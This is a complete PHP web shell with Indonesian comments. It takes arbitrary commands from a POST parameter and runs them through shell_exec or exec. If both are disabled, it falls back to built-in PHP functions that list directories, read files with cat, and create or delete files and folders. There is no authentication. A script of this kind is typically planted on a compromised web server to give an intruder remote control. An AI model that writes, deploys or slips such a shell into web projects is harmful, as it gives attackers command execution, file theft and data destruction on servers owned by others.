<?php
session_start(); // Mulai sesi untuk menyimpan direktori saat ini

if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];

    // Jika belum ada direktori di sesi, set ke direktori awal
    if (!isset($_SESSION['current_dir'])) {
        $_SESSION['current_dir'] = getcwd();
    }

    // Ubah ke direktori yang tersimpan di sesi
    chdir($_SESSION['current_dir']);

    if ($cmd === 'cd') {
        if (isset($_POST['path'])) {
            $path = $_POST['path'];
            // Coba ubah direktori
            if (chdir($path)) {
                $_SESSION['current_dir'] = getcwd(); // Simpan direktori baru ke sesi
                echo getcwd();
            } else {
                echo "Gagal pindah ke direktori '$path'!";
            }
        } else {
            echo "Path tidak diberikan!";
        }
    } else {
        // Coba shell_exec sebagai opsi utama
        if (function_exists('shell_exec')) {
            $output = shell_exec($cmd);
            if ($output === null) {
                echo "Perintah gagal atau tidak ada output!";
            } else {
                echo $output;
            }
        } 
        // Jika shell_exec dinonaktifkan, coba exec
        elseif (function_exists('exec')) {
            $output = [];
            $return_var = 0;
            exec($cmd, $output, $return_var);
            if ($return_var === 0 && !empty($output)) {
                echo implode("\n", $output);
            } else {
                echo "Perintah gagal atau tidak ada output!";
            }
        } 
        // Jika keduanya mati, fallback ke fungsi PHP bawaan
        else {
            $cmd_parts = explode(' ', $cmd);
            $command = $cmd_parts[0];
            $arg = isset($cmd_parts[1]) ? $cmd_parts[1] : '';

            switch ($command) {
                case 'ls':
                case 'dir':
                    $dir = scandir(getcwd());
                    echo implode("\n", array_diff($dir, ['.', '..']));
                    break;
                case 'mkdir':
                    if ($arg && mkdir($arg)) {
                        echo "Direktori '$arg' berhasil dibuat!";
                    } else {
                        echo "Gagal membuat direktori atau argumen tidak diberikan!";
                    }
                    break;
                case 'rmdir':
                    if ($arg && rmdir($arg)) {
                        echo "Direktori '$arg' berhasil dihapus!";
                    } else {
                        echo "Gagal menghapus direktori atau argumen tidak diberikan!";
                    }
                    break;
                case 'touch':
                    if ($arg && touch($arg)) {
                        echo "File '$arg' berhasil dibuat!";
                    } else {
                        echo "Gagal membuat file atau argumen tidak diberikan!";
                    }
                    break;
                case 'cat':
                    if ($arg && file_exists($arg)) {
                        echo file_get_contents($arg);
                    } else {
                        echo "File tidak ditemukan atau argumen tidak diberikan!";
                    }
                    break;
                case 'rm':
                    if ($arg && file_exists($arg) && unlink($arg)) {
                        echo "File '$arg' berhasil dihapus!";
                    } else {
                        echo "Gagal menghapus file atau argumen tidak diberikan!";
                    }
                    break;
                default:
                    echo "Fungsi shell dinonaktifkan dan perintah tidak didukung!";
                    break;
            }
        }
    }
} else {
    echo "Tidak ada perintah!";
}
?>